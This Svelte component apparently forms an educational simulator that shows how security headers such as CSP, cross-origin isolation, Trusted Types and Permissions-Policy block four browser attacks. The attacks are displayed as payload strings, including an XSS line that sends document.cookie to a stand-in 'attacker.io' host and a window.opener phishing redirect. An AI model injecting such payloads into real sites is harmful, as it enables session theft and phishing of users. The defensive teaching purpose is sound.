<script lang="ts">
	import LabCard from '#lib/components/LabCard.svelte';

	let enableStrictCsp = $state(true);
	let enableCrossOriginIsolation = $state(true);
	let enableTrustedTypes = $state(true);
	let enablePermissionsPolicy = $state(true);
	let enableHstsPreload = $state(true);

	type ThreatKey = 'inline_script' | 'cross_origin_window' | 'dom_xss' | 'sensor_access';
	let selectedThreat = $state<ThreatKey>('inline_script');

	const threats: Record<ThreatKey, { title: string; payload: string; targetHeader: string }> = {
		inline_script: {
			title: 'Inline Script Injection (Stored/Reflected XSS)',
			payload: `<script>fetch("https://attacker.io/steal?cookie=" + document.cookie)</` + `script>`,
			targetHeader: 'Content-Security-Policy'
		},
		cross_origin_window: {
			title: 'Cross-Origin Window Reference & Specter Leak',
			payload: `window.opener.location = "https://phishing.io/login"; // Or SharedArrayBuffer memory timing`,
			targetHeader: 'Cross-Origin-Opener-Policy & COEP'
		},
		dom_xss: {
			title: 'DOM XSS Sink (element.innerHTML Injection)',
			payload: `element.innerHTML = location.search; // Untrusted raw string sink`,
			targetHeader: 'Trusted Types API'
		},
		sensor_access: {
			title: 'Unauthorized Camera & Audio Hardware Access',
			payload: `navigator.mediaDevices.getUserMedia({ video: true, audio: true })`,
			targetHeader: 'Permissions-Policy'
		}
	};

	let simulatedVerdict = $derived.by(() => {
		switch (selectedThreat) {
			case 'inline_script':
				return enableStrictCsp
					? {
							blocked: true,
							status: 'BLOCKED (CSP Violation)',
							reason:
								"Refused to execute inline script because it lacks the valid dynamic cryptographic nonce ('nonce-8f7a9...')."
						}
					: {
							blocked: false,
							status: 'EXPLOITED (Critical)',
							reason:
								'Script executed unrestricted! Attacker successfully accessed document context.'
						};
			case 'cross_origin_window':
				return enableCrossOriginIsolation
					? {
							blocked: true,
							status: 'BLOCKED (Isolated Context)',
							reason:
								'window.opener is null. High-resolution timers and SharedArrayBuffer are safe in isolated cross-origin context.'
						}
					: {
							blocked: false,
							status: 'VULNERABLE (Window Hijack)',
							reason:
								'Cross-origin opener link retained. Attacker page can manipulate opener browsing context.'
						};
			case 'dom_xss':
				return enableTrustedTypes
					? {
							blocked: true,
							status: 'BLOCKED (TypeError: TrustedHTML required)',
							reason:
								"Refused to assign string to 'innerHTML' because Trusted Types policy enforcement rejected non-sanitized raw markup."
						}
					: {
							blocked: false,
							status: 'EXPLOITED (DOM XSS)',
							reason: 'Raw HTML string parsed by DOM parser without sanitization.'
						};
			case 'sensor_access':
				return enablePermissionsPolicy
					? {
							blocked: true,
							status: 'BLOCKED (NotAllowedError)',
							reason:
								'Hardware device permission explicitly disallowed by Permissions-Policy header.'
						}
					: {
							blocked: false,
							status: 'PERMITTED (Hardware Prompt Triggered)',
							reason: 'Browser allowed prompt for sensitive hardware sensors.'
						};
		}
	});

	let activeHeaders = $derived.by(() => {
		const h: Record<string, string> = {
			'X-Content-Type-Options': 'nosniff'
		};
		if (enableStrictCsp) {
			h['Content-Security-Policy'] =
				"default-src 'self'; script-src 'self' 'nonce-8f7a9b1c' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none';";
		}
		if (enableCrossOriginIsolation) {
			h['Cross-Origin-Opener-Policy'] = 'same-origin';
			h['Cross-Origin-Embedder-Policy'] = 'require-corp';
			h['Cross-Origin-Resource-Policy'] = 'same-origin';
		}
		if (enableTrustedTypes) {
			h['Content-Security-Policy'] =
				(h['Content-Security-Policy'] || '') + " require-trusted-types-for 'script';";
		}
		if (enablePermissionsPolicy) {
			h['Permissions-Policy'] = 'camera=(), microphone=(), geolocation=(), interest-cohort=()';
		}
		if (enableHstsPreload) {
			h['Strict-Transport-Security'] = 'max-age=63072000; includeSubDomains; preload';
		}
		return h;
	});
</script>

<LabCard title="Defensive Security Headers & Isolation Simulator" badge="Security 2026">
	<div class="space-y-4 font-mono text-sm">
		<!-- Feature Toggles -->
		<div class="grid grid-cols-2 gap-2 sm:grid-cols-3">
			<button
				onclick={() => (enableStrictCsp = !enableStrictCsp)}
				class="rounded-xl border p-2.5 text-center text-xs font-bold transition {enableStrictCsp
					? 'border-emerald-500 bg-emerald-50 text-emerald-800 dark:bg-emerald-950/60 dark:text-emerald-300'
					: 'border-slate-200 bg-white text-slate-500 dark:border-slate-800 dark:bg-slate-900'}"
			>
				{enableStrictCsp ? '✓ Strict CSP L3' : '✗ CSP Disabled'}
			</button>
			<button
				onclick={() => (enableCrossOriginIsolation = !enableCrossOriginIsolation)}
				class="rounded-xl border p-2.5 text-center text-xs font-bold transition {enableCrossOriginIsolation
					? 'border-emerald-500 bg-emerald-50 text-emerald-800 dark:bg-emerald-950/60 dark:text-emerald-300'
					: 'border-slate-200 bg-white text-slate-500 dark:border-slate-800 dark:bg-slate-900'}"
			>
				{enableCrossOriginIsolation ? '✓ COOP/COEP Isolation' : '✗ Isolation Off'}
			</button>
			<button
				onclick={() => (enableTrustedTypes = !enableTrustedTypes)}
				class="rounded-xl border p-2.5 text-center text-xs font-bold transition {enableTrustedTypes
					? 'border-emerald-500 bg-emerald-50 text-emerald-800 dark:bg-emerald-950/60 dark:text-emerald-300'
					: 'border-slate-200 bg-white text-slate-500 dark:border-slate-800 dark:bg-slate-900'}"
			>
				{enableTrustedTypes ? '✓ Trusted Types' : '✗ Trusted Types Off'}
			</button>
			<button
				onclick={() => (enablePermissionsPolicy = !enablePermissionsPolicy)}
				class="rounded-xl border p-2.5 text-center text-xs font-bold transition {enablePermissionsPolicy
					? 'border-emerald-500 bg-emerald-50 text-emerald-800 dark:bg-emerald-950/60 dark:text-emerald-300'
					: 'border-slate-200 bg-white text-slate-500 dark:border-slate-800 dark:bg-slate-900'}"
			>
				{enablePermissionsPolicy ? '✓ Permissions Policy' : '✗ No Perm Policy'}
			</button>
			<button
				onclick={() => (enableHstsPreload = !enableHstsPreload)}
				class="rounded-xl border p-2.5 text-center text-xs font-bold transition {enableHstsPreload
					? 'border-emerald-500 bg-emerald-50 text-emerald-800 dark:bg-emerald-950/60 dark:text-emerald-300'
					: 'border-slate-200 bg-white text-slate-500 dark:border-slate-800 dark:bg-slate-900'}"
			>
				{enableHstsPreload ? '✓ HSTS Preload' : '✗ HSTS Off'}
			</button>
		</div>

		<!-- Attack Vector Simulator Selector -->
		<div class="space-y-2 border-t border-slate-200 pt-3 dark:border-slate-800">
			<span class="text-xs font-bold text-slate-500 uppercase">Simulate Attack Vector:</span>
			<div class="grid grid-cols-2 gap-2 sm:grid-cols-4">
				{#each Object.keys(threats) as ThreatKey[] as tk (tk)}
					<button
						onclick={() => (selectedThreat = tk)}
						class="rounded-xl border p-2 text-center text-xs font-medium transition {selectedThreat ===
						tk
							? 'border-indigo-500 bg-indigo-50 font-bold text-indigo-700 dark:bg-indigo-950/60 dark:text-indigo-300'
							: 'border-slate-200 bg-white text-slate-600 hover:bg-slate-50 dark:border-slate-800 dark:bg-slate-900 dark:text-slate-400'}"
					>
						{threats[tk].title.split(' ')[0]}
						{threats[tk].title.split(' ')[1]}
					</button>
				{/each}
			</div>
		</div>

		<!-- Threat Evaluation Card -->
		<div
			class="rounded-2xl border p-4 transition-colors {simulatedVerdict.blocked
				? 'border-emerald-200 bg-emerald-50/60 dark:border-emerald-900/60 dark:bg-emerald-950/30'
				: 'border-rose-200 bg-rose-50/60 dark:border-rose-900/60 dark:bg-rose-950/30'}"
		>
			<div class="flex items-center justify-between pb-2">
				<span class="text-xs font-bold text-slate-700 dark:text-slate-300">
					{threats[selectedThreat].title}
				</span>
				<span
					class="rounded-md px-2 py-0.5 text-xs font-bold {simulatedVerdict.blocked
						? 'bg-emerald-600 text-white'
						: 'bg-rose-600 text-white'}"
				>
					{simulatedVerdict.status}
				</span>
			</div>
			<div class="my-2 rounded-lg bg-slate-900 p-2.5 text-xs text-slate-200">
				<code>{threats[selectedThreat].payload}</code>
			</div>
			<p class="text-xs text-slate-700 dark:text-slate-300">
				{simulatedVerdict.reason}
			</p>
		</div>

		<!-- Live Generated HTTP Response Headers -->
		<div
			class="space-y-1.5 rounded-2xl border border-slate-200 bg-slate-950 p-4 text-slate-100 dark:border-slate-800"
		>
			<div
				class="flex items-center justify-between border-b border-slate-800 pb-2 text-xs text-slate-400"
			>
				<span>HTTP/3 200 OK — Defensive Response Headers</span>
				<span class="text-indigo-400">Security Score: {Object.keys(activeHeaders).length}/6</span>
			</div>
			<pre
				class="overflow-x-auto text-xs text-emerald-400">{#each Object.entries(activeHeaders) as [k, v] (k)}<span
						class="text-indigo-300">{k}:</span
					> {v}
				{/each}</pre>
		</div>
	</div>
</LabCard>
